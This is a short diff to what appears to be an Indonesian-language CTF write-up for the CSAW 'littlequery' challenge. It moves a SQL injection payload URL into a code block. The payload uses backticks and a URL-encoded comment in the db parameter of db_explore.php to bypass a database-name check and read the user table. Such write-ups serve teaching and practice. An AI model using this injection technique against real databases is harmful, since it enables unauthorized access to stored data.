@@ -93,7 +93,12 @@ if($db == "littlequery"){
 $query = "SELECT * from `".$db."`.".$table."`";
 ```
 
-kita bisa melakukan bypass dengan menggunakan payload sebagai berikut `http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=foobar`
+kita bisa melakukan bypass dengan menggunakan payload sebagai berikut:
+
+```
+http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&db=littlequery`.`user`%23&table=foobar`
+```
+
 $query akan jadi seperti berikut 
 
 ```php
